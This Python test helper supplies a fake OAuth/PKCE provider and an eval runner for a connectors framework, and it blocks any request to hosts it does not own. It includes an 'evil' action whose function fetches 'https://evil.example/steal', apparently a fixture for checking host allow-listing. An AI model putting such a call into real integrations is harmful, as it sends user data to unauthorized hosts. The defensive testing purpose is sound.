"""Fake OAuth provider + helpers for the connectors framework tests.

Everything runs in-process through ``httpx.MockTransport`` — the fake answers
with the recorded responses in ``tests/fixtures/connectors/fake_provider.json``
and **raises on any host it does not own**, so a test can never reach the
network. It validates PKCE (S256), redirect_uri, client_id and single-use codes
like a real authorization server would.
"""
from __future__ import annotations

import base64
import hashlib
import json
import secrets
from pathlib import Path
from urllib.parse import parse_qs, urlparse

import httpx

from ops_dashboard import connector_registry as registry

RECORDED = json.loads((Path(__file__).parent / "fixtures" / "connectors" / "fake_provider.json").read_text())
AUTH_HOST = "auth.fake.test"
API_HOST = "api.fake.test"


class NetworkForbidden(AssertionError):
    pass


class FakeProvider:
    def __init__(self, *, client_secret: str | None = None, grant_write: bool = True) -> None:
        self.codes: dict[str, dict] = {}
        self.client_secret = client_secret
        self.grant_write = grant_write
        self.calls: list[tuple[str, str]] = []
        self.messages: list[dict] = []
        self.revoked: list[str] = []
        self.refresh_ok = True
        self.issued: dict[str, str] = {}

    # The "browser" side: the user approves on the consent screen.
    def authorize(self, authorize_url: str, *, deny: bool = False) -> dict:
        u = urlparse(authorize_url)
        assert u.scheme == "https" and u.hostname == AUTH_HOST, authorize_url
        q = {k: v[0] for k, v in parse_qs(u.query).items()}
        assert q["response_type"] == "code" and q["code_challenge_method"] == "S256"
        assert urlparse(q["redirect_uri"]).hostname == "127.0.0.1"
        if deny:
            return {"state": q["state"], "error": "access_denied"}
        code = secrets.token_urlsafe(12)
        scopes = q.get("scope", "").split()
        if not self.grant_write:
            scopes = [s for s in scopes if not s.endswith(".write")]
        self.codes[code] = {"challenge": q["code_challenge"], "redirect_uri": q["redirect_uri"],
                            "client_id": q["client_id"], "scopes": scopes}
        return {"state": q["state"], "code": code, "redirect_uri": q["redirect_uri"]}

    def transport(self) -> httpx.MockTransport:
        return httpx.MockTransport(self._handle)

    def _handle(self, request: httpx.Request) -> httpx.Response:
        host = request.url.host
        self.calls.append((request.method, str(request.url)))
        if host not in (AUTH_HOST, API_HOST):
            raise NetworkForbidden(f"test tried to reach {request.url}")
        if request.url.path == "/token":
            return self._token(request)
        if request.url.path == "/revoke":
            form = parse_qs(request.content.decode())
            self.revoked.append(form["token"][0])
            return httpx.Response(200, json={"ok": True})
        auth = request.headers.get("Authorization", "")
        if not auth.startswith("Bearer ") or auth[7:] not in self.issued.values():
            return httpx.Response(401, json={"error": "invalid_token"})
        if request.method == "GET" and request.url.path == "/me":
            return httpx.Response(200, json=RECORDED["me"])
        if request.method == "POST" and request.url.path == "/messages":
            self.messages.append(json.loads(request.content or b"{}"))
            return httpx.Response(200, json=RECORDED["message_posted"])
        return httpx.Response(404, json={"error": "not_found"})

    def _check_client(self, request: httpx.Request, form: dict) -> bool:
        if self.client_secret is None:
            return "Authorization" not in request.headers
        basic = base64.b64encode(f"{form['client_id']}:{self.client_secret}".encode()).decode()
        return request.headers.get("Authorization") == f"Basic {basic}"

    def _token(self, request: httpx.Request) -> httpx.Response:
        form = {k: v[0] for k, v in parse_qs(request.content.decode()).items()}
        if not self._check_client(request, form):
            return httpx.Response(401, json={"error": "invalid_client"})
        if form.get("grant_type") == "refresh_token":
            if not self.refresh_ok:
                return httpx.Response(400, json=RECORDED["error_invalid_grant"])
            body = dict(RECORDED["token_refreshed"])
            self.issued["refreshed"] = body["access_token"]
            return httpx.Response(200, json=body)
        code = form.get("code", "")
        info = self.codes.pop(code, None)                      # single-use code
        if info is None:
            return httpx.Response(400, json={"error": "invalid_grant"})
        digest = hashlib.sha256(form.get("code_verifier", "").encode()).digest()
        challenge = base64.urlsafe_b64encode(digest).rstrip(b"=").decode()
        if challenge != info["challenge"] or form.get("redirect_uri") != info["redirect_uri"] \
                or form.get("client_id") != info["client_id"]:
            return httpx.Response(400, json=RECORDED["error_invalid_grant"])
        body = dict(RECORDED["token_write"] if "fake.write" in info["scopes"] else RECORDED["token_read"])
        body["scope"] = " ".join(info["scopes"])
        self.issued[code] = body["access_token"]
        return httpx.Response(200, json=body)


def _me(client, payload):
    r = client.get(f"https://{API_HOST}/me")
    r.raise_for_status()
    return r.json()


def _post_message(client, payload):
    r = client.post(f"https://{API_HOST}/messages", json={"channel": payload["channel"], "text": payload["text"]})
    r.raise_for_status()
    return r.json()


def _evil(client, payload):
    return client.get("https://evil.example/steal").json()


def fake_spec(connector_id: str = "fakechat", *, client_secret_required: bool = False,
              default_client_id: str = "") -> registry.ConnectorSpec:
    return registry.ConnectorSpec(
        id=connector_id, name="FakeChat", auth="oauth_pkce",
        allowed_hosts=(AUTH_HOST, API_HOST),
        authorize_url=f"https://{AUTH_HOST}/authorize", token_url=f"https://{AUTH_HOST}/token",
        revoke_url=f"https://{AUTH_HOST}/revoke",
        read_scopes=("fake.read",), write_scopes=("fake.write",),
        default_client_id=default_client_id, client_secret_required=client_secret_required,
        actions={
            "me": registry.ActionSpec("me", "read", "Read my profile", _me),
            "post_message": registry.ActionSpec(
                "post_message", "write", "Post a message", _post_message,
                summarize=lambda p: f"Publicar en #{p.get('channel')}: {p.get('text')}"),
            "evil": registry.ActionSpec("evil", "read", "Tries another host", _evil),
        })


def run_eval_case(params: dict) -> str:
    """Run one ``docs/evals/connectors-write-guard.json`` case and return the
    JSON text the eval checks look at. Needs a fresh DB (caller's job)."""
    from ops_dashboard import connector_actions as actions
    from ops_dashboard import connector_oauth as oauth
    from ops_dashboard import connector_store as store
    from ops_dashboard import connector_tokens as tokens

    provider = FakeProvider()
    prev_t = oauth.set_transport(provider.transport())
    prev_b = tokens.use_backend(tokens.MemoryBackend())
    spec = registry.get(params["connector"]) or registry.register(fake_spec(params["connector"]))
    try:
        store.upsert_account(spec.id, client_id="eval-client")
        flow = oauth.start(spec.id, params.get("permission", "read"), listen=False)
        cb = provider.authorize(flow["authorize_url"])
        oauth.complete(cb["state"], cb["code"])
        try:
            out = actions.invoke(spec.id, params["action"], params.get("payload") or {})
        except actions.ActionError as e:
            out = {"ok": False, "error": e.code, "status": e.status}
        out["provider_writes"] = len(provider.messages)
        return json.dumps(out, ensure_ascii=False, sort_keys=True)
    finally:
        oauth.disconnect(spec.id)
        registry.unregister(spec.id)
        tokens.use_backend(prev_b)
        oauth.set_transport(prev_t)
